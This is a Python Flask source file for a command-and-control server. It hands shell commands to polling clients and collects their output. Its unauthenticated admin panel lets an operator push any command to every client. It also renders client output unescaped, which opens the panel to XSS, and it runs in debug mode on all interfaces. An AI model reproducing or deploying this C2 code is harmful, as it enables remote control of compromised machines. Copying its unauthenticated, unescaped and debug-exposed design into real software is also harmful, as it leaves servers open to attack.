# server.py
from flask import Flask, request, jsonify
import logging
import time

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('c2_server')

app = Flask(__name__)

# Store command results
command_results = {}

# Default command to send to clients
DEFAULT_COMMAND = "whoami"

@app.route('/command', methods=['GET'])
def get_command():
    """Endpoint for clients to get commands to execute"""
    command_id = str(int(time.time()))
    
    # Use the whoami command as requested
    command = DEFAULT_COMMAND
    
    logger.info(f"Sending command {command_id}: {command}")
    
    return jsonify({
        "command_id": command_id,
        "command": command
    })

@app.route('/result', methods=['POST'])
def receive_result():
    """Endpoint for clients to send back command execution results"""
    data = request.json
    
    if not data or 'command_id' not in data:
        return jsonify({"status": "error", "message": "Invalid data format"}), 400
    
    command_id = data['command_id']
    command = data.get('command', 'unknown')
    output = data.get('output', '')
    error = data.get('error', '')
    status = data.get('status', 'unknown')
    
    # Store the result
    command_results[command_id] = {
        "command": command,
        "output": output,
        "error": error,
        "status": status,
        "received_at": time.time()
    }
    
    logger.info(f"Received result for command {command_id}: Status: {status}")
    logger.info(f"Command: {command}")
    if output:
        logger.info(f"Output: {output}")
    if error:
        logger.error(f"Error: {error}")
    
    return jsonify({"status": "success"})

@app.route('/admin', methods=['GET'])
def admin_panel():
    """Simple admin panel to view command results"""
    html = "<h1>C2 Server Admin Panel</h1>"
    html += "<h2>Command Results</h2>"
    
    if not command_results:
        html += "<p>No command results yet.</p>"
    else:
        html += "<table border='1'><tr><th>ID</th><th>Command</th><th>Status</th><th>Output</th><th>Error</th></tr>"
        for cmd_id, result in sorted(command_results.items(), reverse=True):
            html += f"<tr><td>{cmd_id}</td><td>{result['command']}</td><td>{result['status']}</td>"
            html += f"<td><pre>{result['output']}</pre></td><td><pre>{result['error']}</pre></td></tr>"
        html += "</table>"
    
    html += "<h2>Send New Command</h2>"
    html += """
    <form action='/set_command' method='post'>
        <label for='command'>Command:</label>
        <input type='text' id='command' name='command' style='width: 300px;' value='whoami'>
        <input type='submit' value='Send Command'>
    </form>
    """
    
    # Add auto-refresh
    html += """
    <script>
        setTimeout(function() {
            location.reload();
        }, 5000);
    </script>
    """
    
    return html

@app.route('/set_command', methods=['POST'])
def set_command():
    """Endpoint to set a new command (from admin panel)"""
    global DEFAULT_COMMAND
    command = request.form.get('command', '')
    DEFAULT_COMMAND = command
    logger.info(f"New default command set: {command}")
    return f"<p>Command set: {command}</p><p><a href='/admin'>Back to Admin Panel</a></p>"

if __name__ == '__main__':
    logger.info("Starting C2 server on port 5000...")
    logger.info(f"Default command set to: {DEFAULT_COMMAND}")
    app.run(host='0.0.0.0', port=5000, debug=True)